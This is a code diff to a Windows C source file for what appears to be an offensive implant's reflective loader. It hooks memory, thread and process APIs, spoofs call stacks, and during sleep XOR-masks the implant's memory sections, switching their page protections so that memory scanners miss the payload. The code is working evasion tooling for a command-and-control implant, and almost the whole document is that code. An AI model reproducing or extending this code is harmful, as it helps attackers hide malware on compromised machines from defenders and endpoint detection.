@@ -19,6 +19,7 @@
 
 #include <windows.h>
 #include <wininet.h>
+#include "hook.h"
 #include "draugr.h"
 #include "proxy.h"
 #include "hash.h"
@@ -44,15 +45,8 @@ void * g_ExitThread;
 /* patched in from loader.spec */
 char xorkey[128] = { 1 };
 
-void applyxor(char * data, DWORD len) {
-	for (DWORD x = 0; x < len; x++) {
-		data[x] ^= xorkey[x % 128];
-	}
-}
-
 /* some globals */
-char *                g_dllBase;
-DWORD                 g_dllSize;
+MEMORY_LAYOUT         g_layout;
 SYNTHETIC_STACK_FRAME g_stackFrame;
 
 void init_frame_info()
@@ -339,7 +333,7 @@ ULONG_PTR draugr(PFUNCTION_CALL functionCall)
 LPVOID WINAPI _VirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect)
 {
     #if DEBUG
-    dprintf("[BEACON] _VirtualAlloc\n");
+    dprintf("[UDRL] _VirtualAlloc\n");
     dprintf(" -> lpAddress        : 0x%lp\n", lpAddress);
     dprintf(" -> dwSize           : %d\n", dwSize);
     dprintf(" -> flAllocationType : %d\n", flAllocationType);
@@ -362,7 +356,7 @@ LPVOID WINAPI _VirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationT
 LPVOID WINAPI _VirtualAllocEx(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect)
 {
     #if DEBUG
-    dprintf("[BEACON] _VirtualAllocEx\n");
+    dprintf("[UDRL] _VirtualAllocEx\n");
     dprintf(" -> hProcess         : 0x%lp\n", hProcess);
     dprintf(" -> lpAddress        : 0x%lp\n", lpAddress);
     dprintf(" -> dwSize           : %d\n", dwSize);
@@ -387,7 +381,7 @@ LPVOID WINAPI _VirtualAllocEx(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, 
 BOOL WINAPI _VirtualProtect(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect)
 {
     #if DEBUG
-    dprintf("[BEACON] _VirtualProtect\n");
+    dprintf("[UDRL] _VirtualProtect\n");
     dprintf(" -> lpAddress      : 0x%lp\n", lpAddress);
     dprintf(" -> dwSize         : %d\n", dwSize);
     dprintf(" -> flNewProtect   : %d\n", flNewProtect);
@@ -410,7 +404,7 @@ BOOL WINAPI _VirtualProtect(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect,
 BOOL WINAPI _VirtualProtectEx(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect)
 {
     #if DEBUG
-    dprintf("[BEACON] _VirtualProtectEx\n");
+    dprintf("[UDRL] _VirtualProtectEx\n");
     dprintf(" -> hProcess       : 0x%lp\n", hProcess);
     dprintf(" -> lpAddress      : 0x%lp\n", lpAddress);
     dprintf(" -> dwSize         : %d\n", dwSize);
@@ -435,7 +429,7 @@ BOOL WINAPI _VirtualProtectEx(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, 
 BOOL WINAPI _VirtualFree(LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType)
 {
     #if DEBUG
-    dprintf("[BEACON] _VirtualFree\n");
+    dprintf("[UDRL] _VirtualFree\n");
     dprintf(" -> lpAddress  : 0x%lp\n", lpAddress);
     dprintf(" -> dwSize     : %d\n", dwSize);
     dprintf(" -> dwFreeType : %d\n", dwFreeType);
@@ -456,7 +450,7 @@ BOOL WINAPI _VirtualFree(LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType)
 BOOL WINAPI _GetThreadContext(HANDLE hThread, LPCONTEXT lpContext)
 {
     #if DEBUG
-    dprintf("[BEACON] _GetThreadContext\n");
+    dprintf("[UDRL] _GetThreadContext\n");
     dprintf(" -> hThread   : 0x%lp\n", hThread);
     dprintf(" -> lpContext : 0x%lp\n", lpContext);
     #endif
@@ -475,7 +469,7 @@ BOOL WINAPI _GetThreadContext(HANDLE hThread, LPCONTEXT lpContext)
 BOOL WINAPI _SetThreadContext(HANDLE hThread, const CONTEXT *lpContext)
 {
     #if DEBUG
-    dprintf("[BEACON] _SetThreadContext\n");
+    dprintf("[UDRL] _SetThreadContext\n");
     dprintf(" -> hThread   : 0x%lp\n", hThread);
     dprintf(" -> lpContext : 0x%lp\n", lpContext);
     #endif
@@ -494,7 +488,7 @@ BOOL WINAPI _SetThreadContext(HANDLE hThread, const CONTEXT *lpContext)
 HINTERNET WINAPI _InternetOpenA(LPCSTR lpszAgent, DWORD dwAccessType, LPCSTR lpszProxy, LPCSTR lpszProxyBypass, DWORD dwFlags)
 {
     #if DEBUG
-    dprintf("[BEACON] _InternetOpenA\n");
+    dprintf("[UDRL] _InternetOpenA\n");
     dprintf(" -> lpszAgent       : %s\n", lpszAgent);
     dprintf(" -> dwAccessType    : %d\n", dwAccessType);
     dprintf(" -> lpszProxy       : %s\n", lpszProxy);
@@ -519,7 +513,7 @@ HINTERNET WINAPI _InternetOpenA(LPCSTR lpszAgent, DWORD dwAccessType, LPCSTR lps
 HINTERNET WINAPI _InternetConnectA(HINTERNET hInternet, LPCSTR lpszServerName, INTERNET_PORT nServerPort, LPCSTR lpszUserName, LPCSTR lpszPassword, DWORD dwService, DWORD dwFlags, DWORD_PTR dwContext)
 {
     #if DEBUG
-    dprintf("[BEACON] _InternetConnectA\n");
+    dprintf("[UDRL] _InternetConnectA\n");
     dprintf(" -> hInternet      : 0x%lp\n", hInternet);
     dprintf(" -> lpszServerName : %s\n", lpszServerName);
     dprintf(" -> nServerPort    : %d\n", nServerPort);
@@ -550,7 +544,7 @@ HINTERNET WINAPI _InternetConnectA(HINTERNET hInternet, LPCSTR lpszServerName, I
 DWORD WINAPI _ResumeThread(HANDLE hThread)
 {
     #if DEBUG
-    dprintf("[BEACON] _ResumeThread\n");
+    dprintf("[UDRL] _ResumeThread\n");
     dprintf(" -> hThread : 0x%lp\n", hThread);
     #endif
 
@@ -567,7 +561,7 @@ DWORD WINAPI _ResumeThread(HANDLE hThread)
 HANDLE WINAPI _CreateThread(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId)
 {
     #if DEBUG
-    dprintf("[BEACON] _CreateThread\n");
+    dprintf("[UDRL] _CreateThread\n");
     dprintf(" -> lpThreadAttributes : 0x%lp\n", lpThreadAttributes);
     dprintf(" -> dwStackSize        : %d\n", dwStackSize);
     dprintf(" -> lpStartAddress     : 0x%lp\n", lpStartAddress);
@@ -594,7 +588,7 @@ HANDLE WINAPI _CreateThread(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwS
 HANDLE WINAPI _CreateRemoteThread(HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId)
 {
     #if DEBUG
-    dprintf("[BEACON] _CreateRemoteThread\n");
+    dprintf("[UDRL] _CreateRemoteThread\n");
     dprintf(" -> hProcess           : 0x%lp\n", hProcess);
     dprintf(" -> lpThreadAttributes : 0x%lp\n", lpThreadAttributes);
     dprintf(" -> dwStackSize        : %d\n", dwStackSize);
@@ -623,7 +617,7 @@ HANDLE WINAPI _CreateRemoteThread(HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThrea
 HANDLE WINAPI _OpenProcess(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId)
 {
     #if DEBUG
-    dprintf("[BEACON] _OpenProcess\n");
+    dprintf("[UDRL] _OpenProcess\n");
     dprintf(" -> dwDesiredAccess : %d\n", dwDesiredAccess);
     dprintf(" -> bInheritHandle  : %d\n", bInheritHandle);
     dprintf(" -> dwProcessId     : %d\n", dwProcessId);
@@ -644,7 +638,7 @@ HANDLE WINAPI _OpenProcess(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwP
 HANDLE WINAPI _OpenThread(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwThreadId)
 {
     #if DEBUG
-    dprintf("[BEACON] _OpenThread\n");
+    dprintf("[UDRL] _OpenThread\n");
     dprintf(" -> dwDesiredAccess : %d\n", dwDesiredAccess);
     dprintf(" -> bInheritHandle  : %d\n", bInheritHandle);
     dprintf(" -> dwThreadId      : %d\n", dwThreadId);
@@ -665,7 +659,7 @@ HANDLE WINAPI _OpenThread(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwTh
 BOOL WINAPI _CloseHandle(HANDLE hObject)
 {
     #if DEBUG
-    dprintf("[BEACON] _CloseHandle\n");
+    dprintf("[UDRL] _CloseHandle\n");
     dprintf(" -> hObject : 0x%lp\n", hObject);
     #endif
 
@@ -682,7 +676,7 @@ BOOL WINAPI _CloseHandle(HANDLE hObject)
 HANDLE WINAPI _CreateFileMappingA(HANDLE hFile, LPSECURITY_ATTRIBUTES lpFileMappingAttributes, DWORD flProtect, DWORD dwMaximumSizeHigh, DWORD dwMaximumSizeLow, LPCSTR lpName)
 {
     #if DEBUG
-    dprintf("[BEACON] _CreateFileMappingA\n");
+    dprintf("[UDRL] _CreateFileMappingA\n");
     dprintf(" -> hFile                   : 0x%lp\n", hFile);
     dprintf(" -> lpFileMappingAttributes : 0x%lp\n", lpFileMappingAttributes);
     dprintf(" -> flProtect               : %d\n", flProtect);
@@ -709,7 +703,7 @@ HANDLE WINAPI _CreateFileMappingA(HANDLE hFile, LPSECURITY_ATTRIBUTES lpFileMapp
 LPVOID WINAPI _MapViewOfFile(HANDLE hFileMappingObject, DWORD dwDesiredAccess, DWORD dwFileOffsetHigh, DWORD dwFileOffsetLow, SIZE_T dwNumberOfBytesToMap)
 {
     #if DEBUG
-    dprintf("[BEACON] _MapViewOfFile\n");
+    dprintf("[UDRL] _MapViewOfFile\n");
     dprintf(" -> hFileMappingObject   : 0x%lp\n", hFileMappingObject);
     dprintf(" -> dwDesiredAccess      : %d\n", dwDesiredAccess);
     dprintf(" -> dwFileOffsetHigh     : %d\n", dwFileOffsetHigh);
@@ -734,7 +728,7 @@ LPVOID WINAPI _MapViewOfFile(HANDLE hFileMappingObject, DWORD dwDesiredAccess, D
 BOOL WINAPI _UnmapViewOfFile(LPCVOID lpBaseAddress)
 {
     #if DEBUG
-    dprintf("[BEACON] _UnmapViewOfFile\n");
+    dprintf("[UDRL] _UnmapViewOfFile\n");
     dprintf(" -> lpBaseAddress : 0x%lp\n", lpBaseAddress);
     #endif
 
@@ -751,7 +745,7 @@ BOOL WINAPI _UnmapViewOfFile(LPCVOID lpBaseAddress)
 SIZE_T WINAPI _VirtualQuery(LPCVOID lpAddress, PMEMORY_BASIC_INFORMATION lpBuffer, SIZE_T dwLength)
 {
     #if DEBUG
-    dprintf("[BEACON] _VirtualQuery\n");
+    dprintf("[UDRL] _VirtualQuery\n");
     dprintf(" -> lpAddress : 0x%lp\n", lpAddress);
     dprintf(" -> lpBuffer  : 0x%lp\n", lpBuffer);
     dprintf(" -> dwLength  : %d\n", dwLength);
@@ -772,7 +766,7 @@ SIZE_T WINAPI _VirtualQuery(LPCVOID lpAddress, PMEMORY_BASIC_INFORMATION lpBuffe
 BOOL WINAPI _DuplicateHandle(HANDLE hSourceProcessHandle, HANDLE hSourceHandle, HANDLE hTargetProcessHandle, LPHANDLE lpTargetHandle, DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwOptions)
 {
     #if DEBUG
-    dprintf("[BEACON] _DuplicateHandle\n");
+    dprintf("[UDRL] _DuplicateHandle\n");
     dprintf(" -> hSourceProcessHandle : 0x%lp\n", hSourceProcessHandle);
     dprintf(" -> hSourceHandle        : 0x%lp\n", hSourceHandle);
     dprintf(" -> hTargetProcessHandle : 0x%lp\n", hTargetProcessHandle);
@@ -801,7 +795,7 @@ BOOL WINAPI _DuplicateHandle(HANDLE hSourceProcessHandle, HANDLE hSourceHandle, 
 BOOL WINAPI _ReadProcessMemory(HANDLE hProcess, LPCVOID lpBaseAddress, LPVOID lpBuffer, SIZE_T nSize, SIZE_T * lpNumberOfBytesRead)
 {
     #if DEBUG
-    dprintf("[BEACON] _ReadProcessMemory\n");
+    dprintf("[UDRL] _ReadProcessMemory\n");
     dprintf(" -> hProcess            : 0x%lp\n", hProcess);
     dprintf(" -> lpBaseAddress       : 0x%lp\n", lpBaseAddress);
     dprintf(" -> lpBuffer            : 0x%lp\n", lpBuffer);
@@ -826,7 +820,7 @@ BOOL WINAPI _ReadProcessMemory(HANDLE hProcess, LPCVOID lpBaseAddress, LPVOID lp
 BOOL WINAPI _WriteProcessMemory(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T * lpNumberOfBytesWritten)
 {
     #if DEBUG
-    dprintf("[BEACON] _WriteProcessMemory\n");
+    dprintf("[UDRL] _WriteProcessMemory\n");
     dprintf(" -> hProcess               : 0x%lp\n", hProcess);
     dprintf(" -> lpBaseAddress          : 0x%lp\n", lpBaseAddress);
     dprintf(" -> lpBuffer               : 0x%lp\n", lpBuffer);
@@ -851,7 +845,7 @@ BOOL WINAPI _WriteProcessMemory(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID l
 DECLSPEC_NORETURN VOID WINAPI _ExitThread(DWORD dwExitCode)
 {
     #if DEBUG
-    dprintf("[BEACON] _ExitThread\n");
+    dprintf("[UDRL] _ExitThread\n");
     dprintf(" -> dwExitCode : %d\n", dwExitCode);
     #endif
 
@@ -868,7 +862,7 @@ DECLSPEC_NORETURN VOID WINAPI _ExitThread(DWORD dwExitCode)
 BOOL WINAPI _CreateProcessA(LPCSTR lpApplicationName, LPSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCSTR lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation)
 {
     #if DEBUG
-    dprintf("[BEACON] _CreateProcessA\n");
+    dprintf("[UDRL] _CreateProcessA\n");
     dprintf(" -> lpApplicationName    : %s\n", lpApplicationName);
     dprintf(" -> lpCommandLine        : %s\n", lpCommandLine);
     dprintf(" -> lpProcessAttributes  : 0x%lp\n", lpProcessAttributes);
@@ -903,7 +897,7 @@ BOOL WINAPI _CreateProcessA(LPCSTR lpApplicationName, LPSTR lpCommandLine, LPSEC
 VOID WINAPI _Sleep(DWORD dwMilliseconds)
 {
     #if DEBUG
-    dprintf("[BEACON] _Sleep\n");
+    dprintf("[UDRL] _Sleep\n");
     dprintf(" -> dwMilliseconds : %d\n", dwMilliseconds);
     #endif
 
@@ -924,9 +918,9 @@ VOID WINAPI _Sleep(DWORD dwMilliseconds)
 	call.argc     = 1;
 	call.args[0]  = (ULONG_PTR)(dwMilliseconds);
 
-    applyxor(g_dllBase, g_dllSize);
+    xormemory(TRUE);
 	draugr(&call);
-    applyxor(g_dllBase, g_dllSize);
+    xormemory(FALSE);
 }
 
 HMODULE WINAPI _LoadLibraryA(LPCSTR lpLibFileName)
@@ -1048,13 +1042,67 @@ char * WINAPI _GetProcAddress(HMODULE hModule, LPCSTR lpProcName)
     return result;
 }
 
-void go(IMPORTFUNCS * funcs, char * dllBase, DWORD dllsz)
+void applyxor(char * data, DWORD len)
+{
+    #if DEBUG
+    dprintf("XOR'ing 0x%lp (length %d)\n", data, len);
+    #endif
+
+	for (DWORD x = 0; x < len; x++) {
+		data[x] ^= xorkey[x % 128];
+	}
+}
+
+BOOL isWriteable(DWORD protection)
+{
+    if (protection == PAGE_EXECUTE_READWRITE || protection == PAGE_EXECUTE_WRITECOPY || protection == PAGE_READWRITE || protection == PAGE_WRITECOPY) {
+        return TRUE;
+    }
+    return FALSE;
+}
+
+void xorsection(MEMORY_SECTION * section, BOOL mask)
+{
+    if (mask == TRUE && isWriteable(section->currentProtect) == FALSE) {
+        DWORD oldProtect = 0;
+        if (_VirtualProtect(section->baseAddress, section->size, PAGE_READWRITE, &oldProtect)) {
+            section->currentProtect  = PAGE_READWRITE;
+            section->previousProtect = oldProtect;
+        }
+    }
+
+    if (isWriteable(section->currentProtect)) {
+        applyxor(section->baseAddress, section->size);
+    }
+
+    if (mask == FALSE && section->currentProtect != section->previousProtect) {
+        DWORD oldProtect;
+        if (_VirtualProtect(section->baseAddress, section->size, section->previousProtect, &oldProtect)) {
+            section->currentProtect  = section->previousProtect;
+            section->previousProtect = oldProtect;
+        }
+    }
+}
+
+void xorregion(MEMORY_REGION * region, BOOL mask)
+{
+    for (int i = 0; i < 5; i++) {
+        xorsection(&region->sections[i], mask);
+    }
+}
+
+void xormemory(BOOL mask) {
+    xorregion(&g_layout.beacon, mask);
+}
+
+void go(IMPORTFUNCS * funcs, MEMORY_LAYOUT * layout)
 {
 	funcs->LoadLibraryA   = (__typeof__(LoadLibraryA)   *)_LoadLibraryA;
 	funcs->GetProcAddress = (__typeof__(GetProcAddress) *)_GetProcAddress;
 
-	g_dllBase = dllBase;
-	g_dllSize = dllsz;
+    if (layout != NULL) {
+        g_layout = *layout;
+    }
 
 	init_frame_info();
 }
